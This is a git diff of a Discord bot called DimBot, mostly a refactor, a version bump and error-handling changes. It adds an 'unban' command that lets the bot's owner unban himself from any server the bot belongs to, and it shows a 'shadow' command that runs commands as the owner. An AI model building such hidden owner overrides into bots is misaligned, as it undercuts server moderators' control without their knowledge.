@@ -8,11 +8,11 @@ from discord.ext import commands
 
 import dimond
 import dimsecret
+import obj
 import raceline
 import tribe
 from bitbay import BitBay
 from bruckserver.vireg import Verstapen
-from echo import Bottas
 from missile import Missile, dim_id
 from mod.aegis import Aegis
 from mod.ikaros import Ikaros
@@ -21,12 +21,9 @@ from mod.ikaros import Ikaros
 intent = discord.Intents.none()
 intent.guilds = intent.members = intent.messages = intent.reactions = intent.voice_states = intent.typing = True
 intent.presences = True
-bot = commands.Bot(command_prefix=Missile.prefix_process, intents=intent)
-bot.default_prefix = 't.' if dimsecret.debug else 'd.'
+bot = obj.Bot(command_prefix=Missile.prefix_process, intents=intent)
 bot.help_command = commands.DefaultHelpCommand(verify_checks=False)
-bot.missile = Missile(bot)
-bot.echo = Bottas(bot)
-nickname = f"DimBot {'S ' if dimsecret.debug else ''}| 0.8.20"
+nickname = f"DimBot {'S ' if dimsecret.debug else ''}| 0.8.21"
 # List of activities that will be randomly displayed every 5 minutes
 activities = [
     discord.Activity(name='Echo', type=discord.ActivityType.listening),
@@ -51,8 +48,8 @@ reborn_channel = None
 
 async def binvk(ctx: commands.Context):
     a = randint(1, 100)
-    if a <= 20:
-        if a <= 10:
+    if a <= 10:
+        if a <= 5:
             await ctx.send(sponsor_txt)
         else:
             await ctx.send('Rest in peace for those who lost their lives in the Taiwan train derail accident.')
@@ -143,6 +140,9 @@ async def on_command_error(ctx, error):
         return
     if isinstance(error, commands.errors.RoleNotFound):  # Human error
         await ctx.reply("Invalid role. Maybe you've tagged the wrong one?")
+        return
+    if isinstance(error, commands.errors.GuildNotFound):
+        await ctx.reply('Invalid server or I am not in that server.')
         return
     if isinstance(error, commands.errors.BadArgument):  # Could be a human/program error
         await ctx.reply('Bad arguments.')
@@ -258,6 +258,12 @@ async def shadow(c, *, cmd: str):
     msg.content = bot.default_prefix + cmd
     msg.author = msg.guild.get_member(dim_id)
     await bot.invoke(await bot.get_context(msg))
+
+
+@arccore.command()
+async def unban(ctx: commands.Context, s: discord.Guild):
+    await s.unban(bot.get_user(dim_id), reason='Sasageyo')
+    await ctx.reply('Done.')
 
 
 # Eggy requested this command
